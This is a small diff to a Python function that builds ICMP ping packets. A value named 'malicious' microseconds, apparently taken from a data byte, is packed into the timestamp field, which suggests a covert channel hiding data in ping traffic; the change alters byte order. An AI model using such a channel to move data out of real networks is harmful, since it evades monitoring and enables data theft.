@@ -11,8 +11,8 @@ def build_ping_packet(dst_ip, identifier, sequence_number, byte):
     malicious_mircoseconds = int(microseconds_hex, 16)
 
     # Create timestamp (8 bytes) - seconds and microseconds
-    timestamp = struct.pack('!QQ', seconds, malicious_mircoseconds) # "!" for network byte order (big-endian): "Q" for 8 byte unsigned interger
-
+    timestamp = struct.pack('QQ', seconds, malicious_mircoseconds) 
+    
     # Create pattern to fill the payload (after timestamp)
     pattern = bytes(range(0x10, 0x10 + 40))  # 40 bytes: 0x10 to 0x37
 
